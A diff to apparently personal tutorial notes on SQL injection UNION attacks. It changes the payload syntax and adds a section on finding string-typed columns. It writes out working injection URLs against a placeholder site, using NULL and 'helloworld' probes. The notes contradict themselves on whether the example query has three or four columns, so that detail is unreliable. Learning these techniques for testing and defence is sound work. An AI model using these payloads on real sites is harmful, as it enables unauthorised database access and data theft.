@@ -20,13 +20,36 @@ KEY: Error on ORDER BY n+1 statement and higher.
 You can also do this with NULL statements.
 
 The 3 queries below will return an error:
-https://www.website.com/products?category=Category1'+UNION+SELECT+NULL;
-https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL;
-https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL;
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL--
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL--
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL--
 
 The URL below will return the table along with an empty row.
-https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL,NULL;
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL,NULL--
 
 This also indicates to you that there are 4 columns.
 
 KEY: Error on all UNION SELECT n*NULL except when n = the amount of columns in the returned query.
+
+
+2. Finding columns with a useful data type in an SQL injection UNION attack
+
+Another useful piece of knowledge you as an attacker will want to know in a UNION attack is where string data types can be returned inside the table.  Each column in a table
+has a certain data type.  For example, a column that is designated for integer cannot have the string 'helloworld' inside of it.
+
+To find a column that returns strings, you have to do a test similar to finding how many columns are in the table.  It is easier to find columns that have strings in
+it if you first know how many columns there are, so I suggest you use (1.) in this file to find out how many columns your query returns.
+
+To find how many columns are returned in the query, you constructed a url that returned a table with an additional row, thus the query returns 3 columns:
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL--
+
+To find out which of the three columns returned strings, use the following urls:
+https://www.website.com/products?category=Category1'+UNION+SELECT+'helloworld',NULL,NULL-- (Test 1)
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,'helloworld',NULL-- (Test 2)
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,'helloworld'-- (Test 3)
+
+For each test, if it did not return an error but instead returned a table with 'helloworld' appearing in it, it will indicate to you which columns return strings.
+
+KEY:
+Test 1 successful means the first column contains string types.
+Test 2 unsuccessful means the second column does not contain string types.
